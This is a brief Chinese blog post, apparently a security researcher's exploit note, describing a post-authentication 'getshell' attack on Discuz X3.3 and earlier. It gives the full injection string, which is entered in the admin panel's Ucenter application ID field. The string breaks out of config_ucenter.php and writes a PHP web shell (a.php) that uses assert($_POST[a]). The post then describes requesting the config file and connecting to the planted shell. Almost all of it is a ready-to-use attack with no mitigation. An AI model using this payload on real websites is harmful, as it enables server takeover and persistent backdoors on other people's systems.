---
title: "discuz 后台 getshell"
date: 2017-12-07T00:00:00+08:00
draft: false
author: "X1r0z"

tags: ['cms']
categories: ['web']

hiddenFromHomePage: false
hiddenFromSearch: false
twemoji: false
lightgallery: true
ruby: true
fraction: true
fontawesome: true
linkToMarkdown: true
rssFullText: false

toc:
  enable: true
  auto: true
code:
  copy: true
  maxShownLines: 50
math:
  enable: false
share:
  enable: true
comment:
  enable: true
---


适用于 Discuz X3.3 及之前版本

<!--more-->

站长 - Ucenter 设置 - Ucenter 应用 ID

![](http://exp10it-1252109039.cossh.myqcloud.com/2017/12/17/1513512699.jpg)

填入代码

`123');file_put_contents('a.php','<?php assert($_POST[a])?>');//`

保存

本地查看 config_ucenter.php

![](http://exp10it-1252109039.cossh.myqcloud.com/2017/12/17/1513512701.jpg)

访问 /config/config_ucenter.php

![](http://exp10it-1252109039.cossh.myqcloud.com/2017/12/17/1513512703.jpg)

空白

file_put_contents 执行成功

![](http://exp10it-1252109039.cossh.myqcloud.com/2017/12/17/1513512704.jpg)

连接 a.php

![](http://exp10it-1252109039.cossh.myqcloud.com/2017/12/17/1513512707.jpg)